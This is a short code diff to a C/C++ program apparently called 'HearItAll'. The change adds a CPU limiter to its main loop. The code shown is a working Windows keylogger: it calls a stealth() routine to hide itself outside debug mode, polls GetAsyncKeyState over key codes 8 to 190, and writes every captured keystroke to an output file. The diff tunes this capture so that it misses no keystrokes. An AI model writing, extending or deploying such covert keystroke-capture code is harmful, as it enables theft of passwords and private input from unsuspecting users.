@@ -1,7 +1,12 @@
 #include "HearItAll.h"
+#include "CPULimiter.h"
 
 int main()
 {
+	// To detect a maximum performance and detect all the keystrokes yo need to 
+	// use between 25-30% of CPU
+	CPULimiter limiter = 30;
+
 	if (!DEBUG)
 		stealth();
 	char i;
@@ -14,10 +19,14 @@ int main()
 
 	// Main loop
 	while (true)
+	{
 		for (i = 8; i <= 190; i++)
+		{
 			if (GetAsyncKeyState(i) == -32767)
 				saveKey(i, &OUTPUT_FILE);
-
+			limiter.CalculateAndSleep();
+		}
+	}
 	return 0;
 }
 
